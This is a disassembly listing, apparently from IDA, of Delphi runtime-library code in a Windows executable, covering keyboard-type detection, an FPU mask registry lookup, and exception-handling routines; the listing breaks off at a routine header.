		dd 5DC8A2BFh, 9B6E80DDh, 28A2097h, 25C46052h, 0D559F075h
		dd 3511626Eh, 0C37BCAAEh
; [00000006 BYTES: COLLAPSED FUNCTION GetKeyboardType. PRESS KEYPAD "+"	TO EXPAND]
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402BBC	proc near		; CODE XREF: sub_404E74+39p
		push	ebx
		xor	ebx, ebx
		push	0		; nTypeFlag
		call	GetKeyboardType
		cmp	eax, 7
		jnz	short loc_402BE7
		push	1		; nTypeFlag
		call	GetKeyboardType
		and	eax, 0FF00h
		cmp	eax, 0D00h
		jz	short loc_402BE5
		cmp	eax, 400h
		jnz	short loc_402BE7

loc_402BE5:				; CODE XREF: sub_402BBC+20j
		mov	bl, 1

loc_402BE7:				; CODE XREF: sub_402BBC+Dj
					; sub_402BBC+27j
		mov	eax, ebx
		pop	ebx
		retn
sub_402BBC	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_402BEC	proc near		; CODE XREF: sub_404E74+42p

cbData		= dword	ptr -0Ch
Data		= byte ptr -8
hKey		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF4h
		movzx	eax, ds:word_416018
		mov	dword ptr [ebp+Data], eax
		lea	eax, [ebp+hKey]
		push	eax		; phkResult
		push	1		; samDesired
		push	0		; ulOptions
		push	offset aSoftwareBorlan ; "SOFTWARE\\Borland\\Delphi\\RTL"
		push	80000002h	; hKey
		call	RegOpenKeyExA
		test	eax, eax
		jnz	short loc_402C64
		xor	eax, eax
		push	ebp
		push	offset loc_402C5D
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	[ebp+cbData], 4
		lea	eax, [ebp+cbData]
		push	eax		; lpcbData
		lea	eax, [ebp+Data]
		push	eax		; lpData
		push	0		; lpType
		push	0		; lpReserved
		push	offset aFpumaskvalue ; "FPUMaskValue"
		mov	eax, [ebp+hKey]
		push	eax		; hKey
		call	RegQueryValueExA
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_402C64

loc_402C53:				; CODE XREF: sub_402BEC+76j
		mov	eax, [ebp+hKey]
		push	eax		; hKey
		call	RegCloseKey
		retn
; ---------------------------------------------------------------------------

loc_402C5D:				; DATA XREF: sub_402BEC+2Eo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_402C53
; ---------------------------------------------------------------------------

loc_402C64:				; CODE XREF: sub_402BEC+29j
					; sub_402BEC+70j
					; DATA XREF: ...
		mov	ax, ds:word_416018
		and	ax, 0FFC0h
		mov	dx, word ptr [ebp+Data]
		and	dx, 3Fh
		or	ax, dx
		mov	ds:word_416018,	ax
		mov	esp, ebp
		pop	ebp
		retn
sub_402BEC	endp

; ---------------------------------------------------------------------------
		align 4
; char aSoftwareBorlan[]
aSoftwareBorlan	db 'SOFTWARE\Borland\Delphi\RTL',0 ; DATA XREF: sub_402BEC+18o
; char aFpumaskvalue[]
aFpumaskvalue	db 'FPUMaskValue',0     ; DATA XREF: sub_402BEC+4Co
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402CB0	proc near		; CODE XREF: sub_402FBC+20p
					; CODE:00403102p ...
		fninit
		wait
		fldcw	ds:word_416018
		retn
sub_402CB0	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402CBC	proc near		; CODE XREF: sub_413B60+FFp
		push	esi
		push	edi
		mov	edi, edx
		mov	esi, [eax-2Ch]
		xor	ecx, ecx
		mov	cl, [esi]
		inc	ecx
		rep movsb
		pop	edi
		pop	esi
		retn
sub_402CBC	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402CD0	proc near		; DATA XREF: CODE:00401064o
					; CODE:004054FCo ...
		push	ebx
		mov	ebx, eax
		mov	eax, ebx
		call	sub_402D00
		call	sub_402520
		mov	edx, eax
		mov	eax, ebx
		call	sub_402D24
		pop	ebx
		retn
sub_402CD0	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402CEC	proc near		; CODE XREF: sub_413F3C+6p
					; DATA XREF: CODE:00401068o ...
		push	ebx
		mov	ebx, eax
		mov	eax, ebx
		call	sub_402D7C
		mov	eax, ebx
		call	sub_402540
		pop	ebx
		retn
sub_402CEC	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402D00	proc near		; CODE XREF: sub_402CD0+5p
		add	eax, 0FFFFFFD8h
		mov	eax, [eax]
		retn
sub_402D00	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402D08	proc near		; DATA XREF: CODE:0040106Co
					; CODE:00405504o ...
		call	sub_402EA8
		test	dl, dl
		jle	short locret_402D16
		call	sub_402E90

locret_402D16:				; CODE XREF: sub_402D08+7j
		retn
sub_402D08	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402D18	proc near		; CODE XREF: sub_402FBC+11Fj
					; CODE:00403263j ...
		test	eax, eax
		jz	short locret_402D23
		mov	dl, 1
		mov	ecx, [eax]
		call	dword ptr [ecx-4]

locret_402D23:				; CODE XREF: sub_402D18+2j
		retn
sub_402D18	endp


; =============== S U B	R O U T	I N E =======================================


sub_402D24	proc near		; CODE XREF: sub_402CD0+13p
		push	ebx
		push	esi
		push	edi
		mov	ebx, eax
		mov	edi, edx
		stosd
		mov	ecx, [ebx-28h]
		xor	eax, eax
		push	ecx
		shr	ecx, 2
		dec	ecx
		rep stosd
		pop	ecx
		and	ecx, 3
		rep stosb
		mov	eax, edx
		mov	edx, esp

loc_402D42:				; CODE XREF: sub_402D24+2Fj
		mov	ecx, [ebx-48h]
		test	ecx, ecx
		jz	short loc_402D4A
		push	ecx

loc_402D4A:				; CODE XREF: sub_402D24+23j
		mov	ebx, [ebx-24h]
		test	ebx, ebx
		jz	short loc_402D55
		mov	ebx, [ebx]
		jmp	short loc_402D42
; ---------------------------------------------------------------------------

loc_402D55:				; CODE XREF: sub_402D24+2Bj
		cmp	esp, edx
		jz	short loc_402D76

loc_402D59:				; CODE XREF: sub_402D24+50j
		pop	ebx
		mov	ecx, [ebx]
		add	ebx, 4

loc_402D5F:				; CODE XREF: sub_402D24+4Cj
		mov	esi, [ebx+10h]
		test	esi, esi
		jz	short loc_402D6C
		mov	edi, [ebx+14h]
		mov	[edi+eax], esi

loc_402D6C:				; CODE XREF: sub_402D24+40j
		add	ebx, 1Ch
		dec	ecx
		jnz	short loc_402D5F
		cmp	esp, edx
		jnz	short loc_402D59

loc_402D76:				; CODE XREF: sub_402D24+33j
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_402D24	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402D7C	proc near		; CODE XREF: sub_402CEC+5p
		push	ebx
		push	esi
		mov	ebx, eax
		mov	esi, eax

loc_402D82:				; CODE XREF: sub_402D7C+1Bj
		mov	esi, [esi]
		mov	edx, [esi-40h]
		mov	esi, [esi-24h]
		test	edx, edx
		jz	short loc_402D95
		call	sub_40409C
		mov	eax, ebx

loc_402D95:				; CODE XREF: sub_402D7C+10j
		test	esi, esi
		jnz	short loc_402D82
		pop	esi
		pop	ebx
		retn
sub_402D7C	endp


; =============== S U B	R O U T	I N E =======================================


sub_402D9C	proc near		; CODE XREF: sub_413B60+A8p
					; sub_414390+96p
		push	ebx
		push	esi
		mov	esi, edx
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_402DB3
		mov	edx, esi
		mov	eax, [ebx]
		call	sub_402DF0
		test	al, al
		jnz	short loc_402DB8

loc_402DB3:				; CODE XREF: sub_402D9C+8j
		xor	eax, eax
		pop	esi
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_402DB8:				; CODE XREF: sub_402D9C+15j
		mov	al, 1
		pop	esi
		pop	ebx
		retn
sub_402D9C	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402DC0	proc near		; CODE XREF: sub_402E18+13p
		push	edi
		xchg	eax, esi
		jmp	short loc_402DC6
; ---------------------------------------------------------------------------

loc_402DC4:				; CODE XREF: sub_402DC0+1Fj
		mov	esi, [esi]

loc_402DC6:				; CODE XREF: sub_402DC0+2j
		mov	edi, [esi-30h]
		test	edi, edi
		jz	short loc_402DDA
		movzx	ecx, word ptr [edi]
		push	ecx
		add	edi, 2
		repne scasw
		jz	short loc_402DE3
		pop	ecx

loc_402DDA:				; CODE XREF: sub_402DC0+Bj
		mov	esi, [esi-24h]
		test	esi, esi
		jnz	short loc_402DC4
		pop	edi
		retn
; ---------------------------------------------------------------------------

loc_402DE3:				; CODE XREF: sub_402DC0+17j
		pop	eax
		add	eax, eax
		sub	eax, ecx
		mov	esi, [edi+eax*2-4]
		pop	edi
		retn
sub_402DC0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402DF0	proc near		; CODE XREF: sub_402D9C+Ep
		jmp	short loc_402DF4
; ---------------------------------------------------------------------------

loc_402DF2:				; CODE XREF: sub_402DF0+Dj
		mov	eax, [eax]

loc_402DF4:				; CODE XREF: sub_402DF0j
		cmp	eax, edx
		jz	short loc_402E00
		mov	eax, [eax-24h]
		test	eax, eax
		jnz	short loc_402DF2
		retn
; ---------------------------------------------------------------------------

loc_402E00:				; CODE XREF: sub_402DF0+6j
		mov	al, 1
		retn
sub_402DF0	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402E04	proc near		; DATA XREF: CODE:00401050o
					; CODE:004054E8o ...
		mov	eax, 8000FFFFh
		retn
sub_402E04	endp

; ---------------------------------------------------------------------------
		align 4
; [00000001 BYTES: COLLAPSED FUNCTION nullsub_3. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000001 BYTES: COLLAPSED FUNCTION nullsub_1. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000001 BYTES: COLLAPSED FUNCTION nullsub_2. PRESS KEYPAD "+" TO EXPAND]
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402E18	proc near		; DATA XREF: CODE:0040105Co
					; CODE:004054F4o ...
		push	esi
		mov	si, [edx]
		or	si, si
		jz	short loc_402E38
		cmp	si, 0C000h
		jnb	short loc_402E38
		push	eax
		mov	eax, [eax]
		call	sub_402DC0
		pop	eax
		jz	short loc_402E38
		mov	ecx, esi
		pop	esi
		jmp	ecx
; ---------------------------------------------------------------------------

loc_402E38:				; CODE XREF: sub_402E18+7j
					; sub_402E18+Ej ...
		pop	esi
		mov	ecx, [eax]
		jmp	dword ptr [ecx-10h]
sub_402E18	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402E40	proc near		; CODE XREF: sub_405528+Ap
					; sub_40F0A4+1Ep ...

arg_0		= byte ptr  4

		push	edx
		push	ecx
		push	ebx
		test	dl, dl
		jl	short loc_402E4A
		call	dword ptr [eax-0Ch]

loc_402E4A:				; CODE XREF: sub_402E40+5j
		xor	edx, edx
		lea	ecx, [esp+0Ch+arg_0]
		mov	ebx, fs:[edx]
		mov	[ecx], ebx
		mov	[ecx+8], ebp
		mov	dword ptr [ecx+4], offset sub_402E69
		mov	[ecx+0Ch], eax
		mov	fs:[edx], ecx
		pop	ebx
		pop	ecx
		pop	edx
		retn
sub_402E40	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_402E69	proc near		; DATA XREF: sub_402E40+18o
		jmp	sub_402FBC
sub_402E69	endp

; ---------------------------------------------------------------------------
		mov	eax, [esp+2Ch]
		mov	eax, [eax+0Ch]
		test	eax, eax
		jz	short loc_402E87
		mov	ecx, [eax]
		mov	dl, 81h
		push	eax
		call	dword ptr [ecx-4]
		pop	eax
		call	sub_402E90

loc_402E87:				; CODE XREF: CODE:00402E77j
		call	sub_403394
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402E90	proc near		; CODE XREF: sub_402D08+9p
					; CODE:00402E82p ...
		mov	edx, [eax]
		call	dword ptr [edx-8]
		retn
sub_402E90	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402E98	proc near		; CODE XREF: sub_405528+25p
					; sub_40F0A4+F05p ...
		push	ebx
		mov	ebx, eax
		mov	eax, ebx
		mov	edx, [eax]
		call	dword ptr [edx-1Ch]
		mov	eax, ebx
		pop	ebx
		retn
sub_402E98	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402EA8	proc near		; CODE XREF: sub_402D08p
					; sub_4102F8+19p
		test	dl, dl
		jg	short loc_402EAD
		retn
; ---------------------------------------------------------------------------

loc_402EAD:				; CODE XREF: sub_402EA8+2j
		push	eax
		push	edx
		mov	edx, [eax]
		call	dword ptr [edx-18h]
		pop	edx
		pop	eax
		retn
sub_402EA8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402EB8	proc near		; CODE XREF: sub_403394+35p
		cmp	ds:byte_41601C,	1
		jbe	short locret_402ED2
		push	0
		push	0
		push	0
		push	0EEDFADFh
		call	ds:dword_417014

locret_402ED2:				; CODE XREF: sub_402EB8+7j
		retn
sub_402EB8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402ED4	proc near		; CODE XREF: sub_402FBC+4Dp
					; CODE:0040319Dp
		cmp	ds:byte_41601C,	0
		jz	short locret_402EF4
		push	eax
		push	eax
		push	edx
		push	esp
		push	2
		push	0
		push	0EEDFAE4h
		call	ds:dword_417014
		add	esp, 8
		pop	eax

locret_402EF4:				; CODE XREF: sub_402ED4+7j
		retn
sub_402ED4	endp

; ---------------------------------------------------------------------------
		align 4
; START	OF FUNCTION CHUNK FOR sub_402F24

loc_402EF8:				; CODE XREF: sub_402F10+Dj
					; sub_402F24+Bj
		push	esp
		push	1
		push	0
		push	0EEDFAE0h
		call	ds:dword_417014
		add	esp, 4
		pop	eax
		retn
; END OF FUNCTION CHUNK	FOR sub_402F24
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402F10	proc near		; CODE XREF: CODE:00403240p
		cmp	ds:byte_41601C,	1
		jbe	short locret_402F22
		push	eax
		push	dword ptr [ebx+4]
		jmp	loc_402EF8
; ---------------------------------------------------------------------------

locret_402F22:				; CODE XREF: sub_402F10+7j
		retn
sub_402F10	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402F24	proc near		; CODE XREF: sub_402FBC+FDp

; FUNCTION CHUNK AT 00402EF8 SIZE 00000015 BYTES

		cmp	ds:byte_41601C,	1
		jbe	short locret_402F34
		push	eax
		push	ebx
		jmp	loc_402EF8
; ---------------------------------------------------------------------------

locret_402F34:				; CODE XREF: sub_402F24+7j
		retn
sub_402F24	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402F38	proc near		; CODE XREF: sub_402F58+Cp
		test	ecx, ecx
		jz	short locret_402F55
		mov	eax, [ecx+1]
		cmp	byte ptr [ecx],	0E9h
		jz	short loc_402F50
		cmp	byte ptr [ecx],	0EBh
		jnz	short locret_402F55
		movsx	eax, al
		inc	ecx
		inc	ecx
		jmp	short loc_402F53
; ---------------------------------------------------------------------------

loc_402F50:				; CODE XREF: sub_402F38+Aj
		add	ecx, 5

loc_402F53:				; CODE XREF: sub_402F38+16j
		add	ecx, eax

locret_402F55:				; CODE XREF: sub_402F38+2j
					; sub_402F38+Fj
		retn
sub_402F38	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402F58	proc near		; CODE XREF: sub_406284-2FEFp
		cmp	ds:byte_41601C,	1
		jbe	short locret_402F7E
		push	eax
		push	edx
		push	ecx
		call	sub_402F38
		push	ecx
		push	esp
		push	1
		push	0
		push	0EEDFAE1h
		call	ds:dword_417014
		pop	ecx
		pop	ecx
		pop	edx
		pop	eax

locret_402F7E:				; CODE XREF: sub_402F58+7j
		retn
sub_402F58	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402F80	proc near		; CODE XREF: sub_4033E8+28p
		cmp	ds:byte_41601C,	1
		jbe	short locret_402F9B
		push	edx
		push	esp
		push	1
		push	0
		push	0EEDFAE2h
		call	ds:dword_417014
		pop	edx

locret_402F9B:				; CODE XREF: sub_402F80+7j
		retn
sub_402F80	endp


; =============== S U B	R O U T	I N E =======================================


sub_402F9C	proc near		; CODE XREF: CODE:loc_403545p
		push	eax
		push	edx
		cmp	ds:byte_41601C,	1
		jbe	short loc_402FB7
		push	esp
		push	2
		push	0
		push	0EEDFAE3h
		call	ds:dword_417014

loc_402FB7:				; CODE XREF: sub_402F9C+9j
		pop	edx
		pop	eax
		retn
sub_402F9C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_402FBC(struct	_EXCEPTION_POINTERS ExceptionInfo, int,	int, int, int, int, int, int, int)
sub_402FBC	proc near		; CODE XREF: sub_402E69j
					; sub_4035B8:loc_4035FEj ...

ExceptionInfo	= _EXCEPTION_POINTERS ptr  4
arg_8		= dword	ptr  0Ch
arg_24		= dword	ptr  28h

		mov	eax, [esp+ExceptionInfo.ExceptionRecord]
		test	dword ptr [eax+4], 6
		jnz	loc_4030E0
		cmp	dword ptr [eax], 0EEDFADEh
		mov	edx, [eax+18h]
		mov	ecx, [eax+14h]
		jz	short loc_403049
		cld
		call	sub_402CB0
		mov	edx, ds:dword_417010
		test	edx, edx
		jz	loc_4030E0
		call	edx ; dword_417010
		test	eax, eax
		jz	loc_4030E0
		mov	edx, [esp+arg_8]
		mov	ecx, [esp+ExceptionInfo.ExceptionRecord]
		cmp	dword ptr [ecx], 0EEFFACEh
		jz	short loc_403040
		call	sub_402ED4
		cmp	ds:byte_416020,	0
		jbe	short loc_403040
		cmp	ds:byte_41601C,	0
		ja	short loc_403040
		lea	ecx, [esp+ExceptionInfo]
		push	eax
		push	ecx		; ExceptionInfo
		call	UnhandledExceptionFilter
		cmp	eax, 0
		pop	eax
		jz	loc_4030E0
		mov	edx, eax
		mov	eax, [esp+ExceptionInfo.ExceptionRecord]
		mov	ecx, [eax+0Ch]
		jmp	short loc_403070
; ---------------------------------------------------------------------------

loc_403040:				; CODE XREF: sub_402FBC+4Bj
					; sub_402FBC+59j ...
		mov	edx, eax
		mov	eax, [esp+ExceptionInfo.ExceptionRecord]
		mov	ecx, [eax+0Ch]

loc_403049:				; CODE XREF: sub_402FBC+1Dj
		cmp	ds:byte_416020,	1
		jbe	short loc_403070
		cmp	ds:byte_41601C,	0
		ja	short loc_403070
		push	eax
		lea	eax, [esp+4+ExceptionInfo]
		push	edx
		push	ecx
		push	eax		; ExceptionInfo
		call	UnhandledExceptionFilter
		cmp	eax, 0
		pop	ecx
		pop	edx
		pop	eax
		jz	short loc_4030E0

loc_403070:				; CODE XREF: sub_402FBC+82j
					; sub_402FBC+94j ...
		or	dword ptr [eax+4], 2
		push	ebx
		xor	ebx, ebx
		push	esi
		push	edi
		push	ebp
		mov	ebx, fs:[ebx]
		push	ebx
		push	eax
		push	edx
		push	ecx
		mov	edx, [esp+20h+ExceptionInfo.ContextRecord]
		push	0
		push	eax
		push	offset loc_403094
		push	edx
		call	ds:dword_417018

loc_403094:				; DATA XREF: sub_402FBC+CCo
		mov	edi, [esp+arg_24]
		call	sub_405048
		push	dword ptr [eax+0]
		mov	[eax+0], esp
		mov	ebp, [edi+8]
		mov	ebx, [edi+4]
		mov	dword ptr [edi+4], offset loc_4030C0
		add	ebx, 5
		call	sub_402F24
		jmp	ebx
; ---------------------------------------------------------------------------

loc_4030C0:				; DATA XREF: sub_402FBC+F3o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		call	sub_405048
		mov	ecx, [eax+0]
		mov	edx, [ecx]
		mov	[eax+0], edx
		mov	eax, [ecx+8]
		jmp	sub_402D18
; ---------------------------------------------------------------------------

loc_4030E0:				; CODE XREF: sub_402FBC+Bj
					; sub_402FBC+2Dj ...
		mov	eax, 1
		retn
sub_402FBC	endp

; ---------------------------------------------------------------------------
		align 4

loc_4030E8:				; DATA XREF: sub_4071D4o
		mov	eax, [esp+4]
		test	dword ptr [eax+4], 6
		jnz	loc_403268
		cmp	dword ptr [eax], 0EEDFADEh
		jz	short loc_403120
		cld
		call	sub_402CB0
		mov	edx, ds:dword_41700C
		test	edx, edx
		jz	loc_403268
		call	edx ; dword_41700C
		test	eax, eax
		jnz	short loc_403125
		jmp	loc_403268
; ---------------------------------------------------------------------------

loc_403120:				; CODE XREF: CODE:004030FFj
		mov	eax, [eax+18h]
		mov	eax, [eax]

loc_403125:				; CODE XREF: CODE:00403119j
		mov	edx, [esp+8]
		push	ebx
		push	esi
		push	edi
		push	ebp
		mov	ecx, [edx+4]
		mov	ebx, [ecx+5]
		lea	esi, [ecx+9]
		mov	ebp, eax

loc_403138:				; CODE XREF: CODE:00403176j
		mov	eax, [esi]
		test	eax, eax
		jz	short loc_403181
		mov	edi, ebp
		jmp	short loc_403144
; ---------------------------------------------------------------------------

loc_403142:				; CODE XREF: CODE:00403170j
		mov	edi, [edi]

loc_403144:				; CODE XREF: CODE:00403140j
		mov	eax, [eax]
		cmp	eax, edi
		jz	short loc_403181
		mov	ecx, [eax-28h]
		cmp	ecx, [edi-28h]
		jnz	short loc_403169
		mov	eax, [eax-2Ch]
		mov	edx, [edi-2Ch]
		xor	ecx, ecx
		mov	cl, [eax]
		cmp	cl, [edx]
		jnz	short loc_403169
		inc	eax
		inc	edx
		call	sub_402750
		jz	short loc_403181

loc_403169:				; CODE XREF: CODE:00403150j
					; CODE:0040315Ej
		mov	edi, [edi-24h]
		mov	eax, [esi]
		test	edi, edi
		jnz	short loc_403142
		add	esi, 8
		dec	ebx
		jnz	short loc_403138
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		jmp	loc_403268
; ---------------------------------------------------------------------------

loc_403181:				; CODE XREF: CODE:0040313Cj
					; CODE:00403148j ...
		mov	eax, [esp+14h]
		cmp	dword ptr [eax], 0EEDFADEh
		mov	edx, [eax+18h]
		mov	ecx, [eax+14h]
		jz	short loc_4031D4
		call	ds:dword_417010
		mov	edx, [esp+1Ch]
		call	sub_402ED4
		cmp	ds:byte_416020,	0
		jbe	short loc_4031C9
		cmp	ds:byte_41601C,	0
		ja	short loc_4031C9
		lea	ecx, [esp+4]
		push	eax
		push	ecx
		call	UnhandledExceptionFilter
		cmp	eax, 0
		pop	eax
		jz	loc_403268

loc_4031C9:				; CODE XREF: CODE:004031A9j
					; CODE:004031B2j
		mov	edx, eax
		mov	eax, [esp+14h]
		mov	ecx, [eax+0Ch]
		jmp	short loc_4031FB
; ---------------------------------------------------------------------------

loc_4031D4:				; CODE XREF: CODE:00403191j
		cmp	ds:byte_416020,	1
		jbe	short loc_4031FB
		cmp	ds:byte_41601C,	0
		ja	short loc_4031FB
		push	eax
		lea	eax, [esp+8]
		push	edx
		push	ecx
		push	eax
		call	UnhandledExceptionFilter
		cmp	eax, 0
		pop	ecx
		pop	edx
		pop	eax
		jz	short loc_403268

loc_4031FB:				; CODE XREF: CODE:004031D2j
					; CODE:004031DBj ...
		xor	ebx, ebx
		mov	ebx, fs:[ebx]
		push	ebx
		push	eax
		push	edx
		push	ecx
		mov	edx, [esp+28h]
		or	dword ptr [eax+4], 2
		push	esi
		push	0
		push	eax
		push	offset loc_40321C
		push	edx
		call	ds:dword_417018

loc_40321C:				; DATA XREF: CODE:00403210o
		pop	ebx
		mov	edi, [esp+28h]
		call	sub_405048
		push	dword ptr [eax+0]
		mov	[eax+0], esp
		mov	ebp, [edi+8]
		mov	dword ptr [edi+4], offset loc_403248
		mov	eax, [esp+8]
		call	sub_402F10
		jmp	dword ptr [ebx+4]
; ---------------------------------------------------------------------------

loc_403248:				; DATA XREF: CODE:00403235o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		call	sub_405048
		mov	ecx, [eax+0]
		mov	edx, [ecx]
		mov	[eax+0], edx
		mov	eax, [ecx+8]
		jmp	sub_402D18
; ---------------------------------------------------------------------------

loc_403268:				; CODE XREF: CODE:004030F3j
					; CODE:0040310Fj ...
		mov	eax, 1
		retn
; ---------------------------------------------------------------------------
		align 10h
; START	OF FUNCTION CHUNK FOR sub_406284

loc_403270:				; CODE XREF: sub_401860:loc_401916j
					; sub_401924:loc_4019FAj ...
		mov	eax, [esp-4+arg_0]
		mov	edx, [esp-4+arg_4]
		test	dword ptr [eax+4], 6
		jz	short loc_4032A0
		mov	ecx, [edx+4]
		mov	dword ptr [edx+4], offset loc_4032A0
		push	ebx
		push	esi
		push	edi
		push	ebp
		mov	ebp, [edx+8]
		add	ecx, 5
		call	sub_402F58
		call	ecx
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx

loc_4032A0:				; CODE XREF: sub_406284-3005j
					; DATA XREF: sub_406284-3000o
		mov	eax, 1
		retn
; END OF FUNCTION CHUNK	FOR sub_406284
; ---------------------------------------------------------------------------
		align 4

loc_4032A8:				; DATA XREF: sub_4071DCo
		mov	eax, [esp+4]
		test	dword ptr [eax+4], 6
		jnz	loc_403364
		cmp	dword ptr [eax], 0EEDFADEh
		cld
		call	sub_402CB0
		jz	short loc_4032EE
		cmp	ds:byte_416020,	0
		jbe	short loc_4032EE
		cmp	ds:byte_41601C,	0
		ja	short loc_4032EE

loc_4032D9:				; CODE XREF: CODE:004032FEj
		lea	eax, [esp+4]
		push	eax
		call	UnhandledExceptionFilter
		cmp	eax, 0
		jz	short loc_403364
		mov	eax, [esp+4]
		jmp	short loc_403300
; ---------------------------------------------------------------------------

loc_4032EE:				; CODE XREF: CODE:004032C5j
					; CODE:004032CEj ...
		cmp	ds:byte_416020,	1
		jbe	short loc_403300
		cmp	ds:byte_41601C,	0
		jbe	short loc_4032D9

loc_403300:				; CODE XREF: CODE:004032ECj
					; CODE:004032F5j
		or	dword ptr [eax+4], 2
		push	esi
		push	edi
		push	ebp
		mov	edx, [esp+14h]
		push	0
		push	eax
		push	offset loc_40331A
		push	edx
		call	ds:dword_417018

loc_40331A:				; DATA XREF: CODE:0040330Eo
		pop	ebp
		pop	edi
		pop	esi
		mov	eax, [esp+4]
		mov	ebx, 8000FFFFh
		cmp	dword ptr [eax], 0EEDFADEh
		jnz	short loc_403352
		mov	edx, [eax+18h]
		mov	ecx, [eax+14h]
		mov	eax, [esp+8]
		mov	eax, [eax+0Ch]
		test	eax, eax
		jz	short loc_403346
		mov	ebx, [eax]
		call	dword ptr [ebx-20h]
		mov	ebx, eax

loc_403346:				; CODE XREF: CODE:0040333Dj
		mov	eax, [esp+4]
		mov	eax, [eax+18h]
		call	sub_402D18

loc_403352:				; CODE XREF: CODE:0040332Cj
		xor	eax, eax
		mov	esp, [esp+8]
		pop	ecx
		mov	fs:[eax], ecx
		pop	edx
		pop	ebp
		lea	edx, [edx+5]
		pop	ecx
		jmp	edx
; ---------------------------------------------------------------------------

loc_403364:				; CODE XREF: CODE:004032B3j
					; CODE:004032E6j
		mov	eax, 1
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_40336C	proc near		; CODE XREF: sub_412820+19p
					; sub_413FE8+4Bj ...
		or	eax, eax
		jnz	short loc_40337A
		mov	eax, 0D8h
		call	sub_403988
; ---------------------------------------------------------------------------

loc_40337A:				; CODE XREF: sub_40336C+2j
		pop	edx
		push	esp
		push	ebp
		push	edi
		push	esi
		push	ebx
		push	eax
		push	edx
		push	esp
		push	7
		push	1
		push	0EEDFADEh
		push	edx
		jmp	ds:dword_417014
sub_40336C	endp

; ---------------------------------------------------------------------------
		retn

; =============== S U B	R O U T	I N E =======================================


sub_403394	proc near		; CODE XREF: CODE:loc_402E87p
					; sub_4035B8+50p ...

arg_2C		= dword	ptr  30h

		mov	eax, [esp+arg_2C]
		mov	dword ptr [eax+4], offset loc_4033DF
		call	sub_405048
		mov	edx, [eax+0]
		mov	ecx, [edx]
		mov	[eax+0], ecx
		mov	eax, [edx+0Ch]
		and	dword ptr [eax+4], 0FFFFFFFDh
		cmp	dword ptr [eax], 0EEDFADEh
		jz	short loc_4033CE
		mov	eax, [edx+8]
		call	sub_402D18
		call	sub_402EB8

loc_4033CE:				; CODE XREF: sub_403394+2Bj
		xor	eax, eax
		add	esp, 14h
		mov	edx, fs:[eax]
		pop	ecx
		mov	edx, [edx]
		mov	[ecx], edx
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx

loc_4033DF:				; DATA XREF: sub_403394+4o
		mov	eax, 1
		retn
sub_403394	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4033E8	proc near		; CODE XREF: sub_4035B8+55p
					; sub_403618+55p ...

arg_2C		= dword	ptr  30h

		call	sub_405048
		mov	edx, [eax+0]
		mov	ecx, [edx]
		mov	[eax+0], ecx
		mov	eax, [edx+8]
		call	sub_402D18
		pop	edx
		mov	esp, [esp-4+arg_2C]
		xor	eax, eax
		pop	ecx
		mov	fs:[eax], ecx
		pop	eax
		pop	ebp
		call	sub_402F80
		jmp	edx
sub_4033E8	endp

; ---------------------------------------------------------------------------
		retn

; =============== S U B	R O U T	I N E =======================================


sub_403418	proc near		; CODE XREF: sub_401F4C+F5p
					; sub_401F4C+14Ap ...

arg_0		= dword	ptr  4
